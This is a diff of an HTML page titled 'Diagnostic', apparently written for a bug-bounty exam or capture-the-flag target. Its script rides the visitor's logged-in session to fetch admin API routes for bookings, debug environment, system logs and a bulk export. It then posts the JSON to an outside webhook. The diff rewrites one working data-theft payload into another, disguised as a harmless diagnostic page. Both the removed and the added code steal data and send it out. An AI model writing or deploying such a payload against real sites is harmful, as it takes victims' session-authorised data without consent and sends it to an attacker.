@@ -1,55 +1,28 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>System Diagnostic Tool</title>
-</head>
+<head><title>Diagnostic</title></head>
 <body>
-    <h1>System Analysis in Progress...</h1>
     <script>
         const webhook = "https://webhooksite.net/11c8eb00-4696-43a0-9d10-5498131d321a";
-
-        async function exfiltrate(url, label) {
+        async function exfil(url) {
             try {
-                const res = await fetch(url, { credentials: 'include' });
-                
-                // Capture Headers (Flag might be in a custom header)
-                const headers = {};
-                res.headers.forEach((v, k) => { headers[k] = v; });
-
-                const data = await res.json();
-                
-                await fetch(webhook, {
-                    method: "POST",
-                    mode: "no-cors",
-                    body: JSON.stringify({
-                        label: label,
-                        endpoint: url,
-                        headers: headers,
-                        content: data
-                    })
-                });
-            } catch (e) {
-                fetch(webhook + "?error=" + btoa(label + ":" + e.message));
-            }
+                const r = await fetch(url, { credentials: 'include' });
+                const d = await r.json();
+                fetch(webhook, { method: "POST", mode: "no-cors", body: JSON.stringify({ url, d })});
+            } catch (e) {}
         }
 
-        async function startScan() {
-            // 1. Target the end of the database (Page 6)
-            await exfiltrate("https://api-bugbounty-exam.hashacademy.co/api/admin/bookings?page=6&limit=10", "Bookings_Page_6");
-            
-            // 2. Target the very beginning of the database (Page 5/6 variations)
-            await exfiltrate("https://api-bugbounty-exam.hashacademy.co/api/admin/bookings?page=5&limit=10", "Bookings_Page_5");
+        // 1. Check for Environmental/Debug leaks
+        exfil("https://api-bugbounty-exam.hashacademy.co/api/admin/debug/env");
+        exfil("https://api-bugbounty-exam.hashacademy.co/api/admin/system/logs");
+        
+        // 2. Check for the "First" booking (BK-00001) specifically
+        // Sometimes page=6 is empty, but the very first entry is the flag
+        exfil("https://api-bugbounty-exam.hashacademy.co/api/admin/bookings/69d28e841cda77b519a9550e"); // Testing Admin's own ID as a booking lookup
 
-            // 3. Target common sensitive Admin endpoints
-            await exfiltrate("https://api-bugbounty-exam.hashacademy.co/api/admin/settings", "Admin_Settings");
-            await exfiltrate("https://api-bugbounty-exam.hashacademy.co/api/admin/system/status", "System_Status");
-            await exfiltrate("https://api-bugbounty-exam.hashacademy.co/api/admin/stats", "Admin_Stats");
-            
-            // 4. Check for hidden 'config' or 'env' routes
-            await exfiltrate("https://api-bugbounty-exam.hashacademy.co/api/admin/config", "Admin_Config");
-        }
-
-        startScan();
+        // 3. The "Secret" 600-point path: Massive Export
+        // Try to trigger a CSV or JSON export which often bypasses standard filters
+        exfil("https://api-bugbounty-exam.hashacademy.co/api/admin/bookings/export");
     </script>
 </body>
 </html>
